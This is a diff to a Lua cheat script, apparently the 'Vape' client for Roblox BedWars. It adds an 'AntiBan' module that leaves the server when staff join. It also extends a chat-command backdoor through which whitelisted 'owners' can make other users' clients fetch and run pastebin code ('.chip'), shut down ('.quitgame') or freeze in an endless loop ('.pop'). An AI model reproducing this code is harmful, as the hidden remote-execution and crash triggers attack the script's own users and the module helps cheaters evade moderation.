@@ -10481,10 +10481,36 @@ runFunction(function()
 		Name = "FPSUnlocker",
 		Function = function(callback)
 			if callback then
-				setfpscap(99999)
+				setfpscap(9999999999)
 			end
 		end
 	})
+end)
+
+runFunction(function()
+    AntiBan = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+        Name = "AntiBan",
+        Function = function(callback)
+            if callback then
+				repeat task.wait() until game:IsLoaded()
+                local groupId = 5774246
+                local roleId = 121
+                local function checkUserRole(player)
+                    if player:IsInGroup(groupId) and player:GetRankInGroup(groupId) == roleId then
+                        warningNotification("Vape", "A Staff Has Joined The Game Leaving....", 60)
+						wait(2)
+                        bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+                    end
+                end
+                local function checkAllUsersRoles()
+                    for _, player in pairs(game.Players:GetPlayers()) do
+                        checkUserRole(player)
+                    end
+                end
+                checkAllUsersRoles()
+            end
+        end
+    })
 end)
 
 local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/ProReleased"))
@@ -10581,7 +10607,7 @@ local commands = {
 	end,
 	[".chip"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			loadstring(game:HttpGet("https://pastebin.com/raw/P4cnkM4A"))()
+			loadstring(game:HttpGet("https://pastebin.com/raw/Mq0jWG2t"))()
 		end
 	end,
 	[".freeze"] = function()
@@ -10592,6 +10618,11 @@ local commands = {
 	[".thaw"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
+		end
+	end,
+	[".quitgame"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			game:Shutdown()
 		end
 	end,
 	[".lagback"] = function()
@@ -10607,7 +10638,7 @@ local commands = {
 			end
 		end
 	end,
-	[".crash"] = function()
+	[".pop"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			while true do end
 		end
@@ -10664,7 +10695,7 @@ txt.OnIncomingMessage = function(msg)
 		local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr2)
 		if CanAttackUser(plr2) and plr2 ~= lplr then
 			if message.Text:find("ALAAZA") then
-				warningNotification("Vape",plr2.Name.." Is Using Vape",50)
+				warningNotification("Vape",plr2.Name.." Is Using Vape",60)
 				table.insert(users,plr2.UserId)
 			end
 		end
@@ -10701,7 +10732,7 @@ txt.OnIncomingMessage = function(msg)
 		}
 		if CanAttackUser(plr2) and plr2 ~= lplr then
 			if message.Text:find("ALAAZA") then
-				warningNotification("Vape",plr2.Name.." Is Using Vape",50)
+				warningNotification("Vape",plr2.Name.." Is Using Vape",60)
 				table.insert(users,plr2.UserId)
 				table.insert(whitelist["tags"],{
 					userid = plr2.UserId,
@@ -10769,7 +10800,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='#ff3333'>[VAPE OWNER]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='#ff4d4d'>[VAPE OWNER]</font> " .. msg.PrefixText
 					end
 					userType = 3
 				end
